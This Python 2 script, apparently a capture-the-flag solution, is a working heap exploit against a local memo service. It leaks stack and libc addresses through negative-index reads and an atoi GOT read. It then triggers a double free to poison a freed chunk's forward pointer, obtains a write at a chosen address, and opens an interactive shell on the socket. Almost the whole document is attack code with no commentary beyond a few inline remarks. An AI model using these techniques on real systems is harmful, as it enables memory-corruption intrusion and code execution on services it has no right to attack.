import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def add(memo):
    print 'add {}'.format(memo)
    read_until(f, '> ')
    f.write('1'.ljust(8, '\x00') + '\n')
    read_until(f, 'Input memo > ')
    f.write('{}\n'.format(memo))


def show(index):
    print 'show {}'.format(index)
    read_until(f, '> ')
    f.write('2\n')
    read_until(f, 'Input id > ')
    f.write('{}\n'.format(index))
    read_until(f)
    data = read_until(f, '\n\n')
    return data


def remove(index):
    print 'remove {}'.format(index)
    read_until(f, '> ')
    f.write('3\n')
    read_until(f, 'Input id > ')
    f.write('{}\n'.format(index))


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


s, f = sock("127.0.0.1", 4088)

read_until(f, '>>>>')


data = show(-4).strip('\n').rstrip('\n')
addr_stack = u64(data[:8].ljust(8, '\0'))
addr_tables = addr_stack - (0xd0 - 0x40)
print 'addr_stack = {}'.format(hex(addr_stack))

# leaked addr_stack to show's getnline buffer = -22
got_addr_atoi = 0x5555557556b8
data = show('-25'.ljust(8, '\0') + p64(got_addr_atoi)).strip('\n').rstrip('\n')
addr_atoi = u64(data.ljust(8, '\0'))
addr_libc_base = addr_atoi - 0x36e80
print 'addr_atoi = {}'.format(hex(addr_atoi))
print 'addr_libc_base = {}'.format(hex(addr_libc_base))


add('AAAA')
add('BBBB')
remove(0)   # AAAA
remove(1)   # BBBB
remove(-14) # double free AAAA

addr_target = addr_tables - 0xb8
print 'write target'
add(p64(addr_target)) # fd
add('CCCC') # get rid of BBBB
add('DDDD') # get rid of modified chunk (which used to be AAAA)

# should return desired ptr
add('A' * 0x10 + p64(0xdeadbeaf))


shell(s)
